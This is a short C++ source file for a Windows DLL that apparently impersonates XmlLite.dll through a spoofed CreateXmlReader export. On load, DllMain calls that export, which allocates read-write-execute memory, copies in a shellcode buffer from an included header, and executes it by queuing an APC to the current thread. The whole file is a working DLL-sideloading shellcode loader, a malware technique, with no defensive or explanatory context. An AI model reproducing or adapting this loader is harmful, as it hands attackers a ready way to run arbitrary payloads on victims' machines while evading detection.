#include "ntapi.hpp"
#include "otherapi.hpp"
#include "shellcode.hpp"

// XmlLite.dll!CreateXmlReader
EXTERN_C __declspec(dllexport) ULONG_PTR WINAPI CreateXmlReader()
{
    PVOID lpBaseAddress = 0;
    SIZE_T Size = sizeof(buf);
    UNICODE_STRING TempUnicodeString = { 0 };

    NtAllocateVirtualMemory(NtCurrentProcess(), &lpBaseAddress, 0, &Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Fastmemcpy(lpBaseAddress, buf, sizeof(buf));

    NtQueueApcThread(NtCurrentThread(), (PKNORMAL_ROUTINE)lpBaseAddress, 0, 0, 0);


    return Size * (ULONG_PTR)lpBaseAddress;
}



BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls((HMODULE)hinstDLL);
        CreateXmlReader();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
